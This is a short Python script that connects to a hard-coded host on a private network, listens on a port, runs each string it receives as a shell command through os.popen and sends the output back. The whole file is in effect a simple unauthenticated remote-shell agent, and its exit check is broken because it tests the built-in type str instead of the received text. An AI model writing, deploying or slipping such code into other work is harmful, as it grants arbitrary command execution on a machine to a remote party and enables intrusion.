import socket
import os
import threading

HOST = '192.168.178.21'
ME =   '192.168.178.23'
PORT = 65432
PORT_S = 65434


# Replys back to the sender with the output of the console.
def reply(reply_text: str):
    if str == "BREAK OUT":
        listen_socket.close()
        send_socket.sendall(b"Broke out!")
        send_socket.close()
        return
    out = os.popen(reply_text).read()
    send_socket.sendall(bytes(out, 'UTF-8'))
    print("Command sent")


# Waits for connections.
def listen_for_response():
    while True:
        print("Listening..")
        listen_socket.listen()
        conn, _ = listen_socket.accept()
        with conn:
            data = conn.recv(1024)
            reply(data.decode())


thread_response = threading.Thread(target=listen_for_response, name="Response Thread")

send_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
send_socket.connect((HOST, PORT_S))
send_socket.sendall(b"First send succeed!")

listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listen_socket.bind((ME, PORT))

thread_response.start()
